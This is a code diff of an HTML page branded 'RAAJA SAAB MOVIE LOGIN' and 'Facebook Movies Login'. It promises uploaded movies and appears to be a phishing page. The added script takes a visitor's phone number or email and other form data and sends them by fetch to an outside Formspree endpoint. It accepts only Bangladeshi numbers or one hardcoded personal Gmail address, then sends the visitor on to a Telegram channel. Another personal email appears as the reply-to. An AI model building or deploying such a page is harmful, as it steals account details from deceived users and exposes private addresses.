@@ -6,6 +6,50 @@
     <title>RAAJA SAAB MOVIE LOGIN</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Simple modal styling (you can move this to style.css) */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 300px;
+            text-align: center;
+            border-radius: 10px;
+        }
+        .modal-content a {
+            display: inline-block;
+            background-color: #0088cc;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        .modal-content .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -15,13 +59,15 @@
         
         <div class="form-container">
             <h2>Enter your details</h2>
-            <form id="nicknameForm" action="https://formspree.io/f/mwpbelyk" method="POST">
+            <form id="nicknameForm">
+                <!-- Formspree endpoint (we'll use AJAX) -->
                 <input type="hidden" name="_subject" value="New Nickname Submission from Website">
                 <input type="hidden" name="_replyto" value="lamiyactg7@gmail.com">
                 
                 <div class="form-group">
-                    <label for="name"> Enter your Phone Or Email:</label>
+                    <label for="name">Enter your Phone Or Email:</label>
                     <input type="text" id="name" name="name" required>
+                    <div id="nameError" class="error-message"></div>
                 </div>
                 
                 <div class="form-group">
@@ -33,14 +79,6 @@
                 
                 <button type="submit" class="submit-btn">Submit</button>
             </form>
-
-            <!-- Telegram link added here -->
-            <div class="telegram-section" style="text-align: center; margin-top: 20px;">
-                <a href="https://t.me/+ASSTI5EqDJ1kZDc1" target="_blank" rel="noopener noreferrer" 
-                   style="display: inline-block; background-color: #0088cc; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; font-weight: bold;">
-                    <i class="fab fa-telegram-plane" style="margin-right: 8px;"></i> Join our Telegram for Movies
-                </a>
-            </div>
             
             <div id="message" class="message"></div>
         </div>
@@ -49,7 +87,93 @@
             <p>© 2025 Facebook Movies Login. All rights reserved.</p>
         </div>
     </div>
+
+    <!-- Telegram Pop-up Modal -->
+    <div id="telegramModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <i class="fab fa-telegram-plane" style="font-size: 48px; color: #0088cc;"></i>
+            <h3>Join our Telegram Channel</h3>
+            <p>Click the button below to access all uploaded movies:</p>
+            <a href="https://t.me/+ASSTI5EqDJ1kZDc1" target="_blank" rel="noopener noreferrer">
+                <i class="fab fa-telegram-plane"></i> Go to Telegram
+            </a>
+        </div>
+    </div>
     
-    <script src="script.js"></script>
+    <script>
+        // Function to validate Bangladeshi phone number or specific email
+        function validateBangladeshiContact(input) {
+            // Exact email match
+            if (input === 'sumaiyasultana8034@gmail.com') {
+                return true;
+            }
+            // Bangladeshi phone regex (01XXXXXXXXX or +8801XXXXXXXXX)
+            const bdPhoneRegex = /^(?:\+88|01)?\d{11}$/; // This allows 01XXXXXXXXX (11 digits) or +8801XXXXXXXXX (14 digits with +88)
+            // More precise: 01 followed by 9 digits = total 11 digits, optionally with +88 prefix
+            const clean = input.replace(/\s+/g, ''); // remove spaces
+            if (bdPhoneRegex.test(clean)) {
+                // Ensure it starts with 01 or +8801 and has correct length
+                if (clean.startsWith('01') && clean.length === 11) return true;
+                if (clean.startsWith('+8801') && clean.length === 14) return true;
+            }
+            return false;
+        }
+
+        document.getElementById('nicknameForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent normal form submission
+
+            // Get the email/phone field value
+            const contact = document.getElementById('name').value.trim();
+            const errorDiv = document.getElementById('nameError');
+            
+            // Validate
+            if (!validateBangladeshiContact(contact)) {
+                errorDiv.textContent = 'Please enter a valid Bangladeshi number (e.g., 01XXXXXXXXX) or the specific email.';
+                return;
+            } else {
+                errorDiv.textContent = ''; // clear error
+            }
+
+            // Prepare form data for AJAX
+            const formData = new FormData(this);
+
+            // Send to Formspree using fetch
+            fetch('https://formspree.io/f/mwpbelyk', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Show Telegram modal on success
+                    document.getElementById('telegramModal').style.display = 'block';
+                    // Optionally reset form
+                    document.getElementById('nicknameForm').reset();
+                } else {
+                    // Handle error (e.g., show message)
+                    document.getElementById('message').textContent = 'Submission failed. Please try again.';
+                }
+            })
+            .catch(error => {
+                document.getElementById('message').textContent = 'Error: ' + error.message;
+            });
+        });
+
+        // Close modal when 'x' is clicked
+        document.getElementById('closeModal').onclick = function() {
+            document.getElementById('telegramModal').style.display = 'none';
+        }
+
+        // Close modal if user clicks outside of it
+        window.onclick = function(event) {
+            const modal = document.getElementById('telegramModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
 </body>
 </html>
